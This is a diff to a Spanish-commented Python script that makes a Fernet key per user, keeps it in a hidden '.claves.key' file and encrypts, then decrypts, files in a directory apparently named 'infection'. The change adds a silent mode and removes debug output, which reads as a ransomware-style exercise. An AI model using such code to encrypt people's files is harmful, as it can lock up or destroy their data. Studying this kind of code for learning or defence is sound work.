@@ -18,6 +18,11 @@ user = os.popen('whoami').read()[:-1]
 #--------------------------------------------------------------------------------------------------------
 #---------------------------------------CONFIGURACION----------------------------------------------------
 
+parser = argparse.ArgumentParser()
+parser.add_argument('-h')
+parser.add_argument('-r')
+parser.add_argument('-v')
+parser.add_argument('-s', help = "Ejecuta el programa sin que salga nada por consola", action= "store_true", default = False)
 with open (".claves.key", "a") as archivo_clave:
         pass
 
@@ -38,7 +43,7 @@ def guardar_key(user):
     with open (".claves.key", "r") as archivo_clave:
         for linea in archivo_clave:
             if (user + ' :') in linea[:(len(user) + 2)]:
-                print ('el usuario ya existe')
+                #print ('el usuario ya existe')
                 return 0
         key = Fernet.generate_key()
         with open (".claves.key", "a") as archivo_clave:
@@ -81,12 +86,8 @@ def decodificar(lista, key):
 #       - codificas los archivos con la key del usuario
 #--------------------------------------------------------------------------------------------------------
 #-----------------------------------------EJECUCION------------------------------------------------------
+
 archivos = listar_archivos(ruta)
 guardar_key(user)
 codificar(archivos, recuperar_key(user))
-for elem in archivos:
-    os.system(f"cat /home/infection/{elem}")
 decodificar(archivos, recuperar_key(user))
-for elem in archivos:
-    os.system(f"cat /home/infection/{elem}")
-
